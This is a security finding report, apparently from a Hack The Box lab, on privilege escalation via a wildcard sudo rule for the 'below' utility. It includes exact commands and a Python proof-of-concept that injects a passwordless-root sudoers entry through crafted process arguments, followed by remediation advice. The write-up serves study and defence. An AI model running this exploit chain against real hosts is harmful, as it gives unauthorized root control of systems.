# Local Privilege Escalation via Misconfigured sudo Rule for below Utility

**ID:** vuln-0002
**Severity:** HIGH
**Found:** 2026-02-27 10:27:55 UTC
**Target:** outbound.htb
**CWE:** CWE-732
**CVSS:** 8.8

## Description

A local privilege escalation vulnerability was identified on outbound.htb due to an unsafe sudo configuration for user jacob. The sudoers policy allows jacob to execute `/usr/bin/below *` as root without a password, while only blocking a small subset of global flags.

This policy permits execution of `below dump process` with attacker-controlled output path and content influence through process command-line arguments. By controlling a process `cmdline` value and instructing below to dump process data to `/etc/sudoers.d/zz_jacob`, an attacker can create a valid sudoers entry granting full passwordless root privileges.

The issue results from delegating root execution rights to a complex diagnostic binary with wildcard arguments and writable output options.

## Impact

Any attacker who obtains jacob-level access can escalate to full root privileges on the host.

Business and security impact includes:
- Complete host compromise (root shell and unrestricted command execution)
- Unauthorized access to all sensitive files, including root-owned secrets and service credentials
- Ability to tamper with system integrity, persistence, and logs
- Potential pivoting to additional internal systems from a fully privileged foothold

This is a high-impact privilege escalation path that turns a standard user compromise into total system takeover.

## Technical Analysis

The sudo policy for jacob permits:
`(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*`

Although some global flags are denied, the broad wildcard still allows powerful subcommands such as `below dump process` with attacker-chosen options. The `dump process` command supports writing output to an arbitrary file path with `-o`. Process command lines are also included in output fields.

The exploit chain is:
1. Start an attacker-controlled process whose argv contains sudoers-compatible text:
   `#`
   `jacob ALL=(ALL:ALL) NOPASSWD: ALL`
2. Run `sudo /usr/bin/below dump process ... -f cmdline ... -o /etc/sudoers.d/zz_jacob`.
3. below (running as root via sudo) writes captured process cmdline content into `/etc/sudoers.d/zz_jacob`.
4. The created file becomes an active sudoers include granting jacob unrestricted passwordless root.
5. Confirm escalation with `sudo -n id` returning `uid=0(root)`.

Validated evidence:
- `/etc/sudoers.d/zz_jacob` contained:
  `#`
  `jacob ALL=(ALL:ALL) NOPASSWD: ALL`
- `sudo -n id` returned root
- Root flag was readable after escalation, confirming full privilege compromise.

## Proof of Concept

Reproduction steps:
1. Obtain a shell as user jacob on outbound.htb.
2. Verify sudo permissions:
   `sudo -l`
   Confirm jacob can run `/usr/bin/below *` without password.
3. Launch a controlled process with malicious argv including sudoers lines:
   - First line comment marker `#`
   - Second line `jacob ALL=(ALL:ALL) NOPASSWD: ALL`
4. Execute below as root to dump process cmdline data into sudoers include:
   `sudo /usr/bin/below dump process -b "2 min ago" --duration "3 min" -f cmdline -s comm -F "^yes$" --top 1 --disable-title -O raw -o /etc/sudoers.d/zz_jacob`
5. Validate file contents:
   `sudo /bin/cat /etc/sudoers.d/zz_jacob`
6. Validate root escalation:
   `sudo -n id`
7. Demonstrate privileged access:
   `sudo -n cat /root/root.txt`

```
#!/usr/bin/env python3
import subprocess
import time
import os
import signal

def run(cmd, check=False):
    p = subprocess.run(cmd, shell=True, text=True, capture_output=True)
    if check and p.returncode != 0:
        raise RuntimeError(f"Command failed: {cmd}\n{p.stderr}")
    return p.stdout + p.stderr

def main():
    print("[*] Verifying sudo permissions...")
    print(run("sudo -l"))

    payload_argv = "#\njacob ALL=(ALL:ALL) NOPASSWD: ALL"
    print("[*] Spawning controlled process with malicious argv...")
    # Requires bash for exec -a
    proc = subprocess.Popen(
        ["bash", "-lc", f"exec -a $'{payload_argv}' /usr/bin/yes >/dev/null"],
        preexec_fn=os.setsid
    )
    time.sleep(2)

    try:
        print("[*] Writing sudoers include via below dump process...")
        cmd = (
            'sudo /usr/bin/below dump process '
            '-b "2 min ago" --duration "3 min" '
            '-f cmdline -s comm -F "^yes$" --top 1 --disable-title -O raw '
            '-o /etc/sudoers.d/zz_jacob'
        )
        print(run(cmd))
    finally:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)

    print("[*] Reading injected sudoers file...")
    print(run("sudo /bin/cat /etc/sudoers.d/zz_jacob"))

    print("[*] Verifying root escalation...")
    print(run("sudo -n id"))
    print(run("sudo -n whoami"))

if __name__ == "__main__":
    main()
```

## Remediation

1. Remove the vulnerable sudo rule immediately.
   - Delete wildcard access to `/usr/bin/below *` for non-admin users.
   - Restrict access to a minimal, reviewed command set if monitoring access is required.

2. Enforce strict argument-level allowlisting.
   - Do not permit user-controlled output paths (`-o`) for privileged executions.
   - Deny commands that can write arbitrary files or expose attacker-controlled process metadata.

3. Replace direct sudo execution with a hardened wrapper.
   - Create a root-owned wrapper script with fixed safe arguments.
   - Validate and sanitize all input parameters.
   - Use immutable output directories and filenames not under attacker influence.

4. Protect sudoers include paths.
   - Audit `/etc/sudoers` and `/etc/sudoers.d/*` for unsafe wildcard entries.
   - Ensure no operational tooling can write to sudo policy files via delegated root commands.

5. Add defensive monitoring and controls.
   - Alert on writes to `/etc/sudoers` and `/etc/sudoers.d`.
   - Monitor unusual `sudo /usr/bin/below` invocation patterns and suspicious process argv content.
   - Perform periodic least-privilege reviews of all sudo policies.

6. Validate remediation.
   - Re-test escalation path to confirm `sudo -n id` is denied for jacob.
   - Confirm below cannot write to privileged paths under any allowed invocation pattern.
